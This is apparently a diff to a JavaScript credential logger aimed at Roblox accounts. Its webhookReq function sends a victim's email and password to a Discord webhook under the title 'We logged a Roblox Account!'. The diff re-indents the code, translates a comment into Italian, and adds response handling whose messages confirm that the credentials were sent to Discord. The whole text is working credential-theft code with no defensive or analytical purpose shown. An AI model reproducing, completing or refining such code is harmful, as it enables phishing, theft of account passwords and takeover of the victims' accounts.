@@ -1,25 +1,25 @@
 function webhookReq(webhook, email, password) {
   var params = {
-      embeds: [{
-            "title": `We logged a Roblox Account!`,
-            "description": ">>>We logged someone; see information about the user below",
-            "color": 15258703,
-            "fields": [
-              {
-                "name": 'Email',
-                "value": email,
-                inline: true
-              },
-              {
-                "name": 'Password',
-                "value": password,
-                inline: true
-              }
-            ]
+    embeds: [{
+      "title": `We logged a Roblox Account!`,
+      "description": ">>>We logged someone; see information about the user below",
+      "color": 15258703,
+      "fields": [
+        {
+          "name": 'Email',
+          "value": email,
+          inline: true
+        },
+        {
+          "name": 'Password',
+          "value": password,
+          inline: true
+        }
+      ]
     }]
   }
-   
-  // Send the webhook request
+
+  // Invia la richiesta webhook
   fetch(webhook, {
     method: "POST",
     headers: {
@@ -27,6 +27,16 @@ function webhookReq(webhook, email, password) {
     },
     body: JSON.stringify(params)
   })
+  .then(response => {
+    if (response.ok) {
+      console.log('Credenziali inviate con successo su Discord!');
+    } else {
+      console.error('Errore nell\'invio delle credenziali su Discord:', response.statusText);
+    }
+  })
+  .catch(error => {
+    console.error('Errore nell\'invio delle credenziali su Discord:', error);
+  });
 }
 
 // Driver Code:
